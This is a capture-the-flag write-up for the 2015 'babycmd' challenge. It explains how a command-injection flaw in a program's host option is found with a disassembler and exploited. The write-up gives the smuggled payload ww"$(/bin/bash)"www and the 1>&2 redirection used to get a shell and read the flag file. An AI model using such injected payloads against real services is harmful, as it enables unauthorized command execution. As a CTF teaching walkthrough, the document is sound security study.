##Baby's first: babycmd

##TL;DR
If you aren't interested in the long answer to the question of "How does one solve this problem?", 
the short answer is that improper sanitization of the argument to the host commad allowed the 
inclusion of unnecessary characters and the usage of ```host \"%s\"``` allowed us to escape the 
first paren and achieve command execution. The specific payload we used was something to the effect 
of ```host ww."$(/bin/bash)"www```, which gave a shell. The final step was simply directing 
standard output to standard error.

##Overview
For those who wish to learn more about what was described above, this is a more indepth 
write up aimed at displaying the method used to identify the problem and then go about 
exploiting it. The main individuals that contributed to this solution were RyanAiden, 
Captain RedBeard, 1cyFl4m3 and the most progress came from darkstructures. 
Let us begin, we are given the hostname and port ```babycmd3ad...00b.quals.shallweplayaga.me:15491``` 
as well as a program binary.  

##Methology
First things first, we need to download the given binary program and determine what 
it is. 

```
$ file babycmd 
babycmd: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
```

Now we know we are dealing with a 64-bit executable. To run the program we must first give it executable rights. 
To do so, we execute ```chmod +x babycmd*```. Now we can run the program.

Running the program from terminal let's us see the program accepts arguments to the commands ping, dig and host.
```
$ ./babycmd 

Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.047 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.036 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0 0x7fdcbc26e100acket loss, time 1998ms
rtt min/avg/max/mdev = 0.031/0.038/0.047/0.006 ms
Commands: ping, dig, host, exit
: dig hosts

; <<>> DiG 9.9.5-3ubuntu0.2-Ubuntu <<>> hosts
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 47090
;; flags: qr aa ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;hosts.				IN	A

;; Query time: 12 msec
;; SERVER: 127.0.1.1#53(127.0.1.1)
;; WHEN: Thu May 21 11:01:42 CDT 2015
;; MSG SIZE  rcvd: 23

Commands: ping, dig, host, exit
: host host
Host host not found: 3(NXDOMAIN)
Commands: ping, dig, host, exit
: exit
Goodbye
```

The commands seem to be executed through their respective programs on the machine, so this leads us to think this 
could be a command injection challenge. The goal would be to execute our own commands instead of 
ping, dig, and host. Using a disassembler we can get a better idea of what is going on. The disassembled 
code shows the strings being used to execute the respective commands. The host command uses a different format 
than the other two commands. Host is executed via ```host \"%s\"``` rather than just ```host %s``` like the other commands. 
Excellent, the double quotes can be escaped which would enable us to be able to 
inject commands in the form of ``` host "command here" ``` . Trying this in our program tells us 
we entered an invalid hostname. Further digging in the disassembled code reveals some basic checking 
is done on the argument for the host option. To pass the checking, the hostname cannot contain certain characters. 
Using ``` host aa"(command)"aa ``` will pass verification and allow us to inject commands. 

Attempting basic commands such as ``` host aa"ls"aa ``` would not provide any results back and 
``` host aa"ls /"aa ``` would have the spaces stripped out of it. We needed a command with no 
spaces that would grants us access to the machine. After more time than necessary we tried 
``` host ww"$(/bin/bash)aa ``` which popped us into a bash shell locally so we thought we 
had it. Trying this on the remote host gave a slightly different result. Executing standard commands 
would not return any results but trying ``` cat flag ``` returned the error for file 
not found. One of us noticed it was only returning the results of stderr. Great. We can just 
pipe the results of all of our commands from stdout to stderr. After a quick google we found 
this was done by using ```1>&2```. We simply appended this to our previous attempts and we 
were at a standard shell. After digging, we found the flag in the home directory of the user 
babycmd. We read the flag with ``` cat /home/babycmd/flag 1>&2 ```.

The flag was ``` Pretty easy eh!!~ Now let's try something h4rd3r, shallwe?? ```

